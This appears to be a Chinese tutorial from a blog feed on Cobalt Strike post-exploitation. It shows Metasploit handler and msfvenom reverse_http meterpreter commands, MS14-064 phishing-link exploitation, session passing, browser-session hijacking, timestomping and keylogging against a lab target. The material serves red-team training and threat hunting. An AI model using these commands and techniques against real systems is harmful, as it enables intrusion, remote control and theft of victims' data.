href="#4-1-2-3-CS派生MSF会话" class="headerlink" title="4.1.2.3 CS派生MSF会话"></a>4.1.2.3 CS派生MSF会话</h5><p>1.在 Kail上开启metasploit框架，并开启监听。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 10.251.0.33</span><br><span class="line">set lport 7777</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/13.png"></p><p>2.在Cobalt Strike上创建一个监听器。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/14.png"></p><p>3.通过Spawn将会话派生到新创建的监听器中。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/15.png"></p><p>4.在msf服务器上查看会话已经成功派生。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/16.png"></p><h5 id="4-1-2-4-MSF-生成木马与CS会话"><a href="#4-1-2-4-MSF-生成木马与CS会话" class="headerlink" title="4.1.2.4 MSF 生成木马与CS会话"></a>4.1.2.4 MSF 生成木马与CS会话</h5><p>1.通过 msfvenom 生成木马文件。其中LHOST和LPORT要设置为teamserver的IP与端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_http LHOST=10.251.0.35 LPORT=9999 -f exe &gt; /tmp/msf.exe</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/17.png"></p><p>2.在Cobalt Strike上创建一个监听器。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/18.png"></p><p>3.将木马文件上传到目标靶机，并执行。目标成功在Cobalt Strike上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/19.png"></p><h5 id="4-1-2-5-MSF使用溢出exp与CS会话"><a href="#4-1-2-5-MSF使用溢出exp与CS会话" class="headerlink" title="4.1.2.5 MSF使用溢出exp与CS会话"></a>4.1.2.5 MSF使用溢出exp与CS会话</h5><p>使用ms14-064漏洞进行测试。</p><p>这里简单介绍一下ms14-064漏洞：</p><p>Microsoft Windows OLE远程代码执行漏洞，OLE（对象链接与嵌入）是一种允许应用程序共享数据和功能的技术，远程攻击者利用此漏洞通过构造的网站执行任意代码，影响Win95+IE3 –Win10+IE11全版本。</p><p>具体利用流程如下：</p><p>1.在msf服务器上搜索ms14-064模块。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/20.png"></p><p>2、使用对应模块，并设置参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/browser/ms14_064_ole_code_execution</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br></pre></td></tr></table></figure><p>参数设置如下，svrhost、svrport设置为MSF的IP和端口，payload的lhost、lport设置为CS监听器的IP和端口。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/21.png"></p><p>这里要简单说明几个参数的作用：</p><p>1.set Disablepayloadhandler true：这告诉metasploit框架，它不需要在metasploit框架内创建处理程序来服务有效负载连接。</p><p>2.set PrependMigrate true：告诉metasploit框架修改其stager，以便在利用之后立即迁移到另一个进程，此选项对于客户端攻击非常重要。它允许您的会话在被利用的应用程序崩溃或关闭时存活。</p><p>通过exploit执行完，会生成一行钓鱼链接：</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/23.png"></p><p>3.在 Cobalt Strike 上设置监听器。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/22.png"></p><p>监听器设置的payload，hosts和port均要与msf上所设置的一致。</p><p>4.在目标靶机上的IE浏览器中执行MSF的钓鱼链接。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/25.png"></p><h5 id="4-1-2-6-MSF派生CS会话"><a href="#4-1-2-6-MSF派生CS会话" class="headerlink" title="4.1.2.6 MSF派生CS会话"></a>4.1.2.6 MSF派生CS会话</h5><p>通过ms14-064漏洞进行演示。</p><p>1.通过ms14-064漏洞获取目标主机的meterpreter会话。</p><p>步骤与上述的基本一致，只需要修改Lhost、Lport为MSF服务的IP和端口，以及disablepayloadhandler 的值为false即可，参数设置如下。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/26.png"></p><p>通过exploit执行获得链接</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/27.png"></p><p>并在目标靶机上执行即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/28.png"></p><p>这时候可以看到成功获取到meterpreter会话了。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/29.png"></p><p>2.将会话派生到 Cobalt Strike上。</p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject </span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set session 1</span><br></pre></td></tr></table></figure><p>设置对应的参数。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/30.png"></p><p>3.在Cobalt Strike 上创建监听器。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/31.png"></p><p>4.执行msf的模块</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/32.png"></p><p>5.在Cobalt Strike上可以看到会话成功派生。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/33.png"></p><h3 id="4-2-Explore"><a href="#4-2-Explore" class="headerlink" title="4.2 Explore"></a>4.2 Explore</h3><p>用户驱动攻击简单来说就是控制端通过远程控制让受控端来执行某一些操作。 常见的用户驱动攻击的模块如下：屏幕截图、键盘记录、进程处理、端口扫描、用户发现、文件管理、远程vnc、浏览器代理(仅针对ie浏览器)等，如下图所示。</p><p>![](D:/a_sangfor_outside_work/高级威胁组/学习资料/Cobalt Strike/1-Cobalt Strike基础/picture/23.png)</p><h4 id="4-2-1-浏览器代理"><a href="#4-2-1-浏览器代理" class="headerlink" title="4.2.1 浏览器代理"></a>4.2.1 浏览器代理</h4><p>浏览器转发是指在已经攻击成功的目标中，利用目标的信息登录网站进行会话劫持，但是目前只支持目标正在使用IE浏览器的前提下。关于如何判断当前用户是否使用IE浏览器，则可以通过屏幕截图来判断。如下图中，通过屏幕截图可以看到目标正在使用IE浏览器登陆着当前网站。</p><p>具体使用步骤如下：</p><p>1.选择 Browser Privot 代理。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/34.png"></p><p>2.选择对应的进程。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/35.png"></p><p>这里我们要将Proxy Serve Port 的值记录下来。</p><p>在命令行可以看到浏览器代理已经成功开启。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/36.png"></p><p>3.为CS上的服务器的浏览器设置代理。代理服务器的IP地址为teamserver的IP地址，代理端口为刚刚记录下的Proxy Serve Port 的值。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/37.png"></p><p>如果目标用户曾经通过IE浏览器登录某网站后台，并保存登录信息。这时候我们只需要通过访问目标后台地址即可实现免密登录。</p><p>5.通过browserpivot stop 关闭浏览器代理。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/38.png"></p><h4 id="4-2-2-远程VNC"><a href="#4-2-2-远程VNC" class="headerlink" title="4.2.2 远程VNC"></a>4.2.2 远程VNC</h4><p>该模块可以对目标用户进行远程控制，具体使用步骤如下。</p><p>选择VNC模块进行利用。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/39.png"></p><p>运行结果如下：</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/40.png"></p><h4 id="4-2-3-文件管理"><a href="#4-2-3-文件管理" class="headerlink" title="4.2.3 文件管理"></a>4.2.3 文件管理</h4><p>浏览会话系统文件位置在右击会话处，选择 Explore –&gt; File Browser即可打开。在这里可以对当前会话下的文件进行浏览、上传、下载、删除等操作。</p><p>在进行文件浏览时，如果 beacon 设置的 sleep 值较高，CS会因此而变得响应比较慢。</p><p>彩色文件夹表示该文件夹的内容位于此文件浏览器的缓存中；深灰色的文件夹表示该文件夹的内容不在此文件浏览器缓存中。</p><p><strong>文件下载</strong></p><p>download：下载请求的文件。Beacon 会下载它的任务要求获取的每一个文件的固定大小的块。这个块的大小取决于 Beacon 当前的数据通道。HTTP 和 HTTPS 通道会拉取 512kb 的数据块。</p><p>downloads：查看当前 Beacon 正在进行的文件下载列表。</p><p>cancel：该命令加上一个文件名来取消正在进行的一个下载任务。也可以在 cancel 命令中使用通配符来一次取消多个文件下载任务。</p><p>下载文件都将下载到CS团队服务器中，在View –&gt; Download下可看到下载文件的记录，选中文件后使用Sync Files即可将文件下载到本地。</p><p><strong>文件上传</strong></p><p>upload：上传一个文件到目标主机上。</p><p>timestomp：将一个文件的修改属性访问属性和创建时间数据与另一个文件相匹配。当上传一个文件时，有时会想改变此文件的时间戳来使其混入同一文件夹下的其他文件中，使用timestomp 命令就可以完成此工作。</p><p>选择File Browser模块进行利用。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/41.png"></p><p>结果如下：</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/42.png"></p><h4 id="4-2-4-Net-View"><a href="#4-2-4-Net-View" class="headerlink" title="4.2.4 Net View"></a>4.2.4 Net View</h4><p>该模块用于显示域列表、计算机列表或指定计算机的共享资源列表，具体使用步骤如下。</p><p>选择对应的Net View模块利用即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/43.png"></p><p>运行结果如下：</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/44.png"></p><h4 id="4-2-5-端口扫描"><a href="#4-2-5-端口扫描" class="headerlink" title="4.2.5 端口扫描"></a>4.2.5 端口扫描</h4><p>该模块用于探针目标主机所在网段内主机端口开放情况，使用步骤如下。</p><p>1.选择对应的 Port Scan 模块进行利用。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/45.png"></p><p>2.选择需要探针的网段、端口范围、最大连接数以及使用的协议类型。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/46.png"></p><p>3.查看命令行，发现扫描已经开始运行。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/47.png"></p><p>4.在View视图内的Targets可以查看扫描结果。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/48.png"></p><h4 id="4-2-6-进程列表"><a href="#4-2-6-进程列表" class="headerlink" title="4.2.6 进程列表"></a>4.2.6 进程列表</h4><p>该模块用于查看目标的进程，使用该模块可以对目标主机进行进程注入、屏幕截图，键盘记录、删除进程等操作，使用步骤如下。</p><p>1.右键选择Explore下的Process List模块。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/49.png"></p><p>2.控制台输出区可以查看进程列表。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/53.png"></p><p>3.选择explore.exe进程，点击Screenshot进行屏幕截取。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/50.png"></p><p>运行结果可以在view视图的Screenshots中查看。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/52.png"></p><h4 id="4-2-7-屏幕截取"><a href="#4-2-7-屏幕截取" class="headerlink" title="4.2.7 屏幕截取"></a>4.2.7 屏幕截取</h4><p>该模块用于对目标屏幕进行截取，该模块运行的结果与上述在进程列表中通过Screenshot进行截图的结果基本一致，具体使用步骤如下。</p><p>右键选择Explore下的Screenshot模块进行利用即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/51.png"></p><h4 id="4-2-8-键盘记录"><a href="#4-2-8-键盘记录" class="headerlink" title="4.2.8 键盘记录"></a>4.2.8 键盘记录</h4><p>右键选择Explore下的Process List模块。点击Log Keystrokes进行键盘记录，运行结果可以在view视图的Keystrokes中查看。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/54.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://teamssix.com/year/201023-192553.html">https://teamssix.com/year/201023-192553.html</a></li><li><a href="https://xz.aliyun.com/t/3975">https://xz.aliyun.com/t/3975</a></li><li><a href="https://payloads.online/tools/socat">https://payloads.online/tools/socat</a></li><li><a href="https://zhuanlan.zhihu.com/p/93718885">https://zhuanlan.zhihu.com/p/93718885</a></li><li><a href="https://www.anquanke.com/post/id/156299">https://www.anquanke.com/post/id/156299</a></li><li><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></li><li><a href="https://www.freebuf.com/sectool/173366.html">https://www.freebuf.com/sectool/173366.html</a></li><li><a href="https://my.oschina.net/u/4300698/blog/3382230">https://my.oschina.net/u/4300698/blog/3382230</a></li><li><a href="https://segmentfault.com/a/1190000019290085">https://segmentfault.com/a/1190000019290085</a></li><li><a href="https://www.cnblogs.com/cthon/p/9151467.html">https://www.cnblogs.com/cthon/p/9151467.html</a></li><li><a href="https://www.secpulse.com/archives/127186.html">https://www.secpulse.com/archives/127186.html</a></li><li><a href="https://www.freebuf.com/articles/web/231892.html">https://www.freebuf.com/articles/web/231892.html</a></li><li><a href="https://klionsec.github.io/2017/09/23/cobalt-strike/">https://klionsec.github.io/2017/09/23/cobalt-strike/</a></li><li><a href="https://www.renfei.org/blog/introduction-to-spf.html">https://www.renfei.org/blog/introduction-to-spf.html</a></li><li><a href="https://www.cnblogs.com/backlion/p/10616308.html">https://www.cnblogs.com/backlion/p/10616308.html</a></li><li><a href="https://blog.csdn.net/hnjztyx/article/details/52910478">https://blog.csdn.net/hnjztyx/article/details/52910478</a></li><li><a href="http://blog.leanote.com/post/snowming/62ec1132a2c9">http://blog.leanote.com/post/snowming/62ec1132a2c9</a></li><li><a href="https://blog.csdn.net/pipisorry/article/details/52269785">https://blog.csdn.net/pipisorry/article/details/52269785</a></li><li><a href="https://blog.csdn.net/l1028386804/article/details/86675559">https://blog.csdn.net/l1028386804/article/details/86675559</a></li><li><a href="https://www.freebuf.com/company-information/167460.html">https://www.freebuf.com/company-information/167460.html</a></li><li><a href="https://blog.csdn.net/qq_34101364/article/details/108062913">https://blog.csdn.net/qq_34101364/article/details/108062913</a></li><li><a href="https://blog.csdn.net/github_35186068/article/details/80518681">https://blog.csdn.net/github_35186068/article/details/80518681</a></li><li><a href="https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/">https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/</a></li><li><a href="https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/">https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/</a></li><li><a href="https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/">https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;by Tahir 2021.6.8&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;接着基础上篇&lt;/p&gt;
&lt;h2 id=&quot;4-后渗透&quot;&gt;&lt;a href=&quot;#4-后渗透&quot; class=&quot;headerlink&quot; title=&quot;4.后渗透&quot;&gt;&lt;/a&gt;4.</summary>
      
    
    
    
    <category term="威胁猎捕" scheme="http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/"/>
    
    <category term="Cobalt Strike" scheme="http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt-Strike/"/>
    
    
    <category term="Cobalt Strike" scheme="http://example.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>1-Cobalt Strike基础上篇</title>
    <link href="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/"/>
    <id>http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/</id>
    <published>2021-07-03T03:35:03.000Z</published>
    <updated>2021-07-03T03:42:22.369Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p><strong>by Tahir 2021.6.8</strong></p><h2 id="1-Cobalt-Strike-模块详解"><a href="#1-Cobalt-Strike-模块详解" class="headerlink" title="1.Cobalt Strike 模块详解"></a>1.Cobalt Strike 模块详解</h2><h3 id="1-1-Cobalt-Strike-模块"><a href="#1-1-Cobalt-Strike-模块" class="headerlink" title="1.1 Cobalt Strike 模块"></a>1.1 Cobalt Strike 模块</h3><p>Cobalt Strike 模块的功能选项，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/1.png"></p><ul><li>New Connection：打开一个新的”Connect”窗口。在当前窗口中新建一个连接，即可同时连接不同的团队服务器( 便于团队之间的协作)。</li><li>Preferences：偏好设置，首选项，用于设置Cobalt Strike主界面、控制台、TeamServer 连接记录、报告的样式。</li><li>Visualization：将主机以不同的权限展示出来（主要以输出结果的形式展示）。</li><li>VPN Interfaces：设置VPN接口。</li><li>Listeners：创建监听器。</li><li>Script Manager：查看和加载CNA脚本。</li><li>Close：关闭当前与TeamServer的连接。</li></ul><h3 id="1-2-View-模块"><a href="#1-2-View-模块" class="headerlink" title="1.2 View 模块"></a>1.2 View 模块</h3><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/2.png"></p><ul><li>Applications：显示被控机器的应用信息。</li><li>Credentials：通过HashDump或mimikatz获取的密码或者散列值都储存在这里。</li><li>Downloads：从被控机器中下载的文件。</li><li>Event Log：主机上线记录，以及与团队协作相关的聊天记录和操作记录。</li><li>Keystrokes：键盘记录。</li><li>Proxy Pivots：代理模块。</li><li>Screenshots：屏幕截图模块。</li><li>Script Console：控制台，在这里可以加载各种脚本。（链接）</li><li>Targets：显示目标。</li><li>Web Log：Web 访问日志。</li></ul><h3 id="1-3-Attacks-模块"><a href="#1-3-Attacks-模块" class="headerlink" title="1.3 Attacks 模块"></a>1.3 Attacks 模块</h3><p>下面介绍Attacks模块下的Packages 和 Web Drive-by 模块。</p><p><strong>1.Packages模块</strong></p><p>依次单击 “Attacks” → “Packages” 选项，可以看到一系列功能模块，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/3.png"></p><ul><li>HTML Application：基于HTML应用的Payload模块，通过HTML调用其他语言的应用组件进行攻击测试，提供了可执行文件、PowerShell、 VBA三种方法。</li><li>MS Office Macro：生成基于Office病毒的Payload 模块。</li><li>Payload Generator：Payload 生成器，可以生成基于C、C#、COM Scriptlet、 Java、 Perl、 PowerShell、Python、 Ruby、 VBA等的Payload。</li><li>USB/CD AutoPlay：用于生成利用自动播放功能运行的后门文件。</li><li>Windows Dropper：捆绑器，能够对文档进行捆绑并执行Payload。</li><li>Windows Executable：可以生成32位或64位的EXE和基于服务的EXE、DLL等后门程序。在32位的Windows操作系统中无法执行64位的Payload, 而且对于后渗透测试的相关模块，使用32位和64位的Payload会产生不同的影响，因此在使用时应谨慎选择。</li><li>Windows Executable (S)：用于生成一个Windows 可执行文件，其中包含Beacon的完整Payload,不需要阶段性的请求。与Windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持PowerShell脚本，可用于将Stageless Payload注入内存。</li></ul><p><strong>2.Web Drive-by 模块</strong></p><p>依次单击 “Attacks” → “Web Drive-by” 选项，可以看到一系列基于网络驱动的功能模块，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/4.png"></p><ul><li>Manage：管理器，用于对TeamServer上已经开启的Web服务进行管理，包括 Listener 及 Web Delivery模块。</li><li>Clone Site：用于克隆指定网站的样式。</li><li>Host File：用于将指定文件加载到Web目录中，支持修改Mime Type。</li><li>Script Web Delivery：基于Web的攻击测试脚本，自动生成可执行的Payload。</li><li>Signed Applet Attack：使用Java自签名的程序进行钓鱼攻击测试。如果用户有Applet 运行权限，就会执行其中的恶意代码。</li><li>Smart Applet Attack：自动检测Java的版本并进行跨平台和跨浏览器的攻击测试。该模块使用嵌入式漏洞来禁用Java的安全沙盒。可利用此漏洞的Java版本为1.6.0_45以下及1.7.0 _21以下。</li><li>System Profiler：客户端检测工具，可以用来获取一些系统信息，例如系统版本、浏览器版本、Flash版本等。</li></ul><h3 id="1-4-Reporting模块"><a href="#1-4-Reporting模块" class="headerlink" title="1.4 Reporting模块"></a>1.4 Reporting模块</h3><p>Reporting模块可以配合Cobalt Strike的操作记录、结果等，直接生成相关报告，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/5.png"></p><ul><li>Activity report：活动报告生成。</li><li>Hosts report：主机报告。</li><li>Indicators of Compromise：目标报告。</li><li>Sessions Report：会话报告。</li><li>Social Engineering Peport：社会工程学报告。</li><li>Tactics, Techniques, and Procedures：战术技术过程，TTPs。</li><li>Reset Data：重置数据。</li><li>Export data：数据出口。</li></ul><h2 id="2-基础设施"><a href="#2-基础设施" class="headerlink" title="2.基础设施"></a>2.基础设施</h2><p>任何行动的第一步都是建立基础设施。就 Cobalt Strike 而言，基础设施由一个或多个团队服务器、重定向器以及指向你的团队服务器和重定向器的 DNS 记录组成。一旦团队服务器启动并运行，你将需要连接到它并将其配置为接收来自受害系统的连接。监听器就是 Cobalt Strike 中用来执行这种任务的机制。</p><h3 id="2-1-监听器管理"><a href="#2-1-监听器管理" class="headerlink" title="2.1 监听器管理"></a>2.1 监听器管理</h3><ul><li><p>什么是监听器</p><p>顾名思义，监听器就是等待被入侵系统连接自己的一个服务。</p></li><li><p>监听器的作用</p><p>主要是为了接受payload回传的各类数据，类似于MSF中handler的作用。</p><p>比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。</p></li></ul><p>一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境，接下来将深入了解如何准确配置监听器。</p><p>一个监听器既是一个 payload 的配置信息，同时又是 Cobalt Strike 起一个服务器来接收来自这个payload 的连接的指示。一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。 </p><p>监听器的名字一般由以下结构组成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OperatingSystem/Payload/Stager</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br></pre></td></tr></table></figure><p><strong>什么是传输器</strong></p><p>payload staging（分阶段传送 payload）。在很多攻击框架的设计中，解耦了攻击和攻击执行的内容。payload 就是攻击执行的内容。payload 通常被分为两部分：payload stage 和 payload stager。</p><p>攻击载荷<code>payload</code>就是攻击执行的内容。攻击载荷通常被分为两部分：传输器<code>stager</code> 和传输体<code>stage</code>。</p><p>传输器<code>stager</code>是一个小程序，用于连接、下载传输体<code>stage</code>，并插入到内存中。</p><p>stager 